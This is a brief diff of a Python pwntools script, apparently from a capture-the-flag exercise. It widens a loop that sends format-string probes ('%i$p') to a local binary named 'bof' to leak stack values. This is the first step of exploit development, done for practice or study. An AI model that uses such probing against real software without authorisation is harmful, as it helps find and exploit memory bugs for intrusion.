@@ -2,7 +2,7 @@
 from pwn import *
 context.arch = 'amd64'
 context.log_level = 'error'
-for i in range(46,70):
+for i in range(1,70):
     try:
         p = process('./bof')
         temp = f'%{i}$p'
